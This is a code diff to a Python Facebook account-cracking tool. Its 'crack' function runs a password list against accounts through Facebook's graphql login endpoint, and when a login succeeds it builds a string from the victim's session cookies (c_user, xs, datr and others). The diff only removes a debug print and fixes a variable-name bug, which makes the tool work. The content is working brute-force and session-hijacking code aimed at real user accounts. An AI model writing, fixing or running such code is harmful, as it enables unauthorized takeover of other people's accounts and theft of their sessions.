@@ -159,7 +159,6 @@ def crack(uid, password_list, total_count):
             'sec-fetch-dest': 'empty',
             'referer': 'https://www.facebook.com/?_rdr',
             'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',}
-            print(headers)
             data = {
     'av': '0',
     'user': '0',
@@ -240,11 +239,11 @@ def crack(uid, password_list, total_count):
 }
             # Make API request
             response = session.post('https://www.facebook.com/api/graphql/', cookies=cookies, headers=headers, data=data)
-            log_cookies = Session.cookies.get_dict().keys()
+            log_cookies = session.cookies.get_dict().keys()
             # Check response
             if "c_user" in log_cookies:
                 #kuki = convert(session.cookies.get_dict())
-                kuki=";".join([f"{key}={Session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
+                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
                 user = re.findall('c_user=(.*);xs', kuki)[0]
                 ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                 res = requests.get(ckk).text
